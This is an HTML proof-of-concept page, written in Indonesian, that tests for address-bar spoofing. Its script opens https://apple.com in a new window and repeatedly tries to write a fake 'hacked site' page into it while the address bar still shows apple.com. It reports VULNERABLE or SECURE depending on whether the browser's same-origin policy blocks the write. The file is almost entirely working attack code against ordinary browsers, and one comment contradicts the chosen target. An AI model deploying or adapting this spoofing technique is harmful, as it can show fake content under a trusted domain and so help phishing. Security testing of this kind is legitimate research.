<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Address Bar Spoofing - Kelayakan Pengujian</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; text-align: center; }
        button { background-color: #007aff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; }
        button:active { background-color: #0056b3; }
        #log { margin-top: 30px; text-align: left; background: #f5f5f7; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; display: none; }
        .success { color: green; font-weight: bold; }
        .fail { color: red; font-weight: bold; }
    </style>
</head>
<body>

    <h2>PoC Address Bar Spoofing</h2>
    <p>Klik tombol di bawah untuk menguji apakah isi dokumen dapat dimanipulasi saat terjadi error muat halaman:</p>
    
    <button onclick="jalankanPengujian()">Jalankan Pengujian</button>

    <div id="log"><strong>Konsol Log Pengujian:</strong><br></div>

    <script>
        function cetakLog(pesan, sukses = null) {
            var logDiv = document.getElementById("log");
            logDiv.style.display = "block";
            if (sukses === true) {
                logDiv.innerHTML += "<span class='success'>[VULNERABLE] " + pesan + "</span><br>";
            } else if (sukses === false) {
                logDiv.innerHTML += "<span class='fail'>[SECURE] " + pesan + "</span><br>";
            } else {
                logDiv.innerHTML += "[*] " + pesan + "<br>";
            }
        }

        function jalankanPengujian() {
            // Targetkan domain yang memicu NXDOMAIN / Host tidak ditemukan seperti di video
            var targetUrl = "https://apple.com"; 
            cetakLog("Membuka jendela baru menuju: " + targetUrl);
            
            // 1. Buka jendela baru
            var win = window.open(targetUrl, "_blank");
            
            if (!win) {
                cetakLog("Gagal membuka jendela baru. Pastikan pop-up blocker diizinkan.", false);
                return;
            }

            // 2. Gunakan interval waktu untuk mencoba menyuntikkan konten 
            // saat status jaringan berubah menjadi error di browser tujuan
            var percobaan = 0;
            var interval = setInterval(function() {
                percobaan++;
                try {
                    // Mencoba menulis ke dokumen tab baru
                    win.document.write("<html><body><h1 style='color:red; text-align:center;'>Situs Teretas (Spoofed)</h1><p>Jika Anda melihat teks ini sementara address bar tetap menunjukkan apple.com, celah ini valid.</p></body></html>");
                    win.document.close();
                    
                    cetakLog("BERHASIL menyuntikkan konten ke dalam dokumen target!", true);
                    clearInterval(interval);
                } catch(e) {
                    if (percobaan >= 10) {
                        cetakLog("Akses ditolak oleh Same-Origin Policy setelah beberapa kali percobaan. Browser aman.", false);
                        clearInterval(interval);
                    } else {
                        cetakLog("Percobaan ke-" + percobaan + ": Akses masih diblokir (Normal)...");
                    }
                }
            }, 300); // Mencoba setiap 300 milidetik
        }
    </script>

</body>
</html>
